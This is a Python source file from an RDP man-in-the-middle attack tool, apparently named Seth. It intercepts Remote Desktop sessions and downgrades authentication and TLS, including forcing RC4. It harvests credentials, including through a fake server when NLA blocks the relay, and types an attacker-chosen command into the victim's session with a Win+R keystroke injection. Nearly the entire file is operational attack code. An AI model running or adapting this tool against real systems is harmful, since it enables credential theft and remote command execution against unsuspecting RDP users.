import socket
import ssl
import threading
import select
import re
import os
import subprocess
import time
from binascii import hexlify, unhexlify
from base64 import b64encode

from seth.args import args
from seth.parsing import *
import seth.consts as consts


class RDPProxy(threading.Thread):
    """Represents the RDP Proxy"""

    def __init__(self, local_conn, remote_socket):
        super(RDPProxy, self).__init__()
        self.cancelled = False
        self.lsock = local_conn
        self.rsock = remote_socket
        self.vars = {}
        self.injection_key_count = -100
        self.keyinjection_started = False

        if b"RC4-SHA" in subprocess.check_output('openssl ciphers'.split()):
            self.rc4 = True
        else:
            print("Warning: RC4 not available on client, attack might not work")
            self.rc4 = False

        #  self.relay_proxy = None
        #  if args.relay: # TODO
        #      threading.Thread(target=launch_rdp_client).start()
        #      relay_lsock, relay_rsock = open_sockets(consts.RELAY_PORT)
        #      self.relay_proxy = RDPProxyNTLMRelay(relay_lsock, relay_rsock)
        #      self.relay_proxy.start()


    def run(self):
        self.handle_protocol_negotiation()
        if not (self.cancelled or self.vars["RDP_PROTOCOL"] == 0):
            self.enableSSL()
        if args.fake_server:
            try:
                self.run_fake_server()
            except ConnectionResetError:
                print("Connection lost on run_fake_server")
        while not self.cancelled and not args.fake_server:
            try:
                self.forward_data()
            except (ssl.SSLError, ssl.SSLEOFError) as e:
                print("SSLError: %s" % str(e))
            except ValueError:
                print("Something went wrong during the SSL handshake. "
                      "Make sure that /etc/ssl/openssl.cnf contains this "
                      "line in the section [system_default_sect]:")
                print("    MinProtocol = TLSv1.0")
                os._exit(1)
            except (ConnectionResetError, OSError) as e:
                print("Connection lost (%s)" % str(e))
                if "creds" in self.vars:
                    stop_attack()


    def run_fake_server(self):
        bufsize = 4096
            # hide forged protocol
        data = self.lsock.recv(bufsize)
        dump_data(data, From="Client")
        resp = consts.SERVER_RESPONSES[1]
        regex = b".*%s..010c" % hexlify(b"McDn")
        m = re.match(regex, hexlify(resp))
        resp = set_fake_requested_protocol(resp, m,
                                           self.vars["RDP_PROTOCOL"])
        self.lsock.send(resp)
            # start with channel join requests
        data = self.lsock.recv(bufsize)
        dump_data(data, From="Client")
        data = self.lsock.recv(bufsize)
        dump_data(data, From="Client")
        self.lsock.send(consts.SERVER_RESPONSES[2])
            # confirm all requests (reverse engineered; couldn't find
            # documentation on this)
        while True:
            data = self.lsock.recv(bufsize)
            dump_data(data, From="Client")
            self.save_vars(parse_rdp(data, self.vars, From="Client"))
            if "creds" in self.vars:
                self.lsock.send(consts.SERVER_RESPONSES[3])
                break
            if data:
                id = data[-1]
            else:
                id = 0
            self.lsock.send(unhexlify(b"0300000f02f0803e00000803%02x03%02x" %
                                      (id, id)))
        self.close()
        stop_attack()


    def cancel(self):
        self.close()
        self.cancelled = True


    def handle_protocol_negotiation(self):
        data = self.lsock.recv(4096)
        if not data:
            print('No data returned')
            self.cancelled = True
            return None
        dump_data(data, From="Client")
        self.save_vars({"RDP_PROTOCOL_OLD":  data[-4]})
        data = downgrade_auth(data)
        self.save_vars({"RDP_PROTOCOL": data[-4]})

        if args.fake_server:
            self.lsock.send(consts.SERVER_RESPONSES[0])
            return None
        try:
            self.rsock.send(data)
        except socket.error as e:
            print("Error sending data: %s" % e)
            os._exit(1)
        try:
            data = self.rsock.recv(4096)
        except socket.error as e:
            print("Error receiving data: %s" % e)
            os._exit(1)
        dump_data(data, From="Server")

        regex = b"0300.*000300080005000000$"
        m = re.match(regex, hexlify(data))
        if m:
            if not args.fake_server:
                print("Server enforces NLA; switching to 'fake server' mode")
            args.fake_server = True
            data = consts.SERVER_RESPONSES[0]
        try:
            self.lsock.send(data)
        except socket.error as e:
            print("Error sending data: %s" % e)
            os._exit(1)


    def enableSSL(self):
        global SNI
        SNI = ""
        def sni_callback(s, hostname, ctx):
            global SNI
            SNI = hostname
            return None
        print("Enable SSL")
        try:
            sslversion = get_ssl_version(self.lsock)
            ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.load_cert_chain(args.certfile, keyfile=args.keyfile, password=None)
            ctx.sni_callback = sni_callback
            self.lsock = ctx.wrap_socket(
                self.lsock,
                server_side=True,
                do_handshake_on_connect=True,
            )
            if self.rc4:
                try:
                    print("Try to use RC4-SHA cipher")
                    ctx.set_ciphers("RC4-SHA")
                    self.rsock = ctx.wrap_socket(
                        self.rsock,
                        server_hostname=SNI,
                        do_handshake_on_connect=True,
                    )
                except ssl.SSLError:
                    print("Not using RC4-SHA because of SSL Error:", str(e))
                    self.rsock = ctx.wrap_socket(
                        self.rsock,
                        server_hostname=SNI,
                        do_handshake_on_connect=True,
                    )
                except ConnectionResetError as e:
                    print("Unexpected error: %s" % e)
                    os._exit(1)
            else:
                self.rsock = ctx.wrap_socket(
                    self.rsock,
                    server_hostname=SNI,
                    do_handshake_on_connect=True,
                )
        except ConnectionResetError as e:
            print("Connection lost on enableSSL: %s" % e)
        except ssl.SSLEOFError as e:
            print("SSL EOF Error during handshake: %s" % e)
        except AttributeError as e:
            # happens when there is no rsock, i.e. fake_server==True
            print(e)
            pass


    def close(self):
        self.lsock.close()
        if not args.fake_server:
            self.rsock.close()
        else:
            pass


    def forward_data(self):
        readable, _, _ = select.select([self.lsock, self.rsock], [], [])
        for s_in in readable:
            if s_in == self.lsock:
                From = "Client"
                s_out = self.rsock
            elif s_in == self.rsock:
                From = "Server"
                s_out = self.lsock
            try:
                data = read_data(s_in)
            except ssl.SSLError as e:
                self.handle_ssl_error(e)
                data = b""
            if not data:
                self.cancel()
                return False
            dump_data(data, From=From)
            self.save_vars(parse_rdp(data, self.vars, From=From))
            data = tamper_data(data, self.vars, From=From)
            s_out.send(data)

            if From == "Client" and "creds" in self.vars and args.inject:
                self.send_keyinjection(s_out)
        return True


    def save_vars(self, vars):
        for k, v in vars.items():
            if k not in self.vars:
                self.vars[k] = v
                print_var(k, self.vars)


    def handle_ssl_error(self, e):
        if "alert access denied" in str(e):
            print("TLS alert access denied, Downgrading CredSSP")
            self.lsock.send(unhexlify(b"300da003020104a4060204c000005e"))
        elif "alert internal error" in str(e):
            # openssl connecting to windows7 with AES doesn't seem to
            # work, thus try RC4 first
            print("TLS alert internal error received, make sure to use RC4-SHA")
        else:
            raise

    def send_keyinjection(self, s_out):
        attack = convert_str_to_scancodes(args.inject)
        if self.injection_key_count == 0:
            print('Injecting command...')
            for key in attack:
                # use fastpath
                data = unhexlify(b"4404%02x%02x" % (key[1], key[0]))
                dump_data(data, From="Client", Modified=True)
                s_out.send(data)
                time.sleep(key[2])
            print("Pwnd")
        self.injection_key_count += 1


def read_data(sock):
    data = sock.recv(4096)
    if len(data) == 4096:
        while len(data)%4096 == 0:
            data += sock.recv(4096)
    return data


def open_sockets(port):
    try:
        local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as e:
        print("Error creating socket: %s" % e)
        os._exit(1)
    local_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    local_socket.bind((args.bind_ip, args.listen_port))
    local_socket.listen()

    print("Listening for new connection")

    local_conn, addr = local_socket.accept()
    print("Connection received from %s:%d" % addr)

    remote_socket = None
    if not args.fake_server:
        try:
            remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as e:
            print("Error creating socket: %s" % e)
            os._exit(1)
        try:
            remote_socket.connect((args.target_host, port))
        except socket.gaierror as e:
            print("Address-related error connecting to server: %s" % e)
            os._exit(1)
        except socket.error as e:
            print("Connection error: %s" % e)
            os._exit(1)

    return local_conn, remote_socket


def get_ssl_version(sock):
        # Seth behaves differently depeding on the TLS protocol
        # https://bugs.python.org/issue31453
        # This is an ugly hack (as if the rest of this wasn't...)
    versions = [
        ssl.PROTOCOL_TLSv1,
        ssl.PROTOCOL_TLSv1_1,
        ssl.PROTOCOL_TLSv1_2,
        ]
    firstbytes = sock.recv(16, socket.MSG_PEEK)
    try:
        return versions[firstbytes[10]-1]
    except IndexError:
        print("Unexpected SSL version: %s" % hexlify(firstbytes))
        return versions[-1]


#  def launch_rdp_client():
#      time.sleep(1)
#      p = subprocess.Popen(
#          ["xfreerdp",
#           "/v:%s:%d" % (args.bind_ip, consts.RELAY_PORT),
#           "/u:%s\\%s" % (domain, user),
#          ],
#      )


def stop_attack():
    os._exit(0)


def convert_str_to_scancodes(string):
    uppercase_letters = "ABCDEFGHJIJKLMNOPQRSTUVWXYZ"
    # Actually, the following depends on the keyboard layout
    special_chars = {
        ":": ".",
        "{": "[",
        "}": "]",
        "!": "1",
        "@": "2",
        "#": "3",
        "$": "4",
        "%": "5",
        "^": "6",
        "&": "7",
        "*": "8",
        "(": "9",
        ")": "0",
        "<": ",",
        ">": ".",
        "\"": "'",
        "|": "\\",
        "?": "/",
        "_": "-",
        "+": "=",
    }
    UP = 1
    DOWN = 0
    MOD = 2
    # For some reason, the meta (win) key needs an additional modifier (+2)
    result = [[consts.REV_SCANCODE["LMeta"], DOWN + MOD, .2],
              [consts.REV_SCANCODE["R"], DOWN, 0],
              [consts.REV_SCANCODE["R"], UP, 0.2],
              [consts.REV_SCANCODE["LMeta"], UP + MOD, .1],
             ]
    for c in string:
        if c in uppercase_letters:
            result.append([consts.REV_SCANCODE["LShift"], DOWN, 0.02])
            result.append([consts.REV_SCANCODE[c], DOWN, 0])
            result.append([consts.REV_SCANCODE[c], UP, 0])
            result.append([consts.REV_SCANCODE["LShift"], UP, 0])
        elif c in special_chars:
            c = special_chars[c]
            result.append([consts.REV_SCANCODE["LShift"], DOWN, 0.02])
            result.append([consts.REV_SCANCODE[c], DOWN, 0])
            result.append([consts.REV_SCANCODE[c], UP, 0])
            result.append([consts.REV_SCANCODE["LShift"], UP, 0])
        else:
            c = c.upper()
            result.append([consts.REV_SCANCODE[c], DOWN, 0])
            result.append([consts.REV_SCANCODE[c], UP, 0])
    result += [[consts.REV_SCANCODE["Enter"], DOWN, 0],
               [consts.REV_SCANCODE["Enter"], UP, 0],
              ]
    return result


def run():
    try:
        while True:
            lsock, rsock = open_sockets(args.target_port)
            RDPProxy(lsock, rsock).start()
    except KeyboardInterrupt:
        pass
